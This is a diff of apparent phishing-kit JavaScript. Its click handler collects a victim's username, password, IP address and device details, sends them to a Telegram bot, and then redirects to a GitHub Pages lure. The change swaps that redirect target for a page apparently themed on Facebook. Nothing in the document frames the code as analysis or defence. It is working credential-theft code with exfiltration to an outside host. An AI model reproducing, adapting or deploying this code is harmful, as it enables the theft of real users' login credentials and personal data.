@@ -30,7 +30,7 @@ document.getElementById('button').addEventListener('click', async function(e) {
         const data = { username, password, ip, deviceInfo };
         
         await sendToTelegram(data, TOKEN, CHAT_ID);
-        window.location.href = "https://e-talib-fpo.github.io/verification/login.html";
+        window.location.href = "https://moutamadris-mem-gow.github.io/fb/viwer.html";
     } catch (err) {
         console.error('Error:', err);
         alert('حدث خطأ أثناء إرسال البيانات');
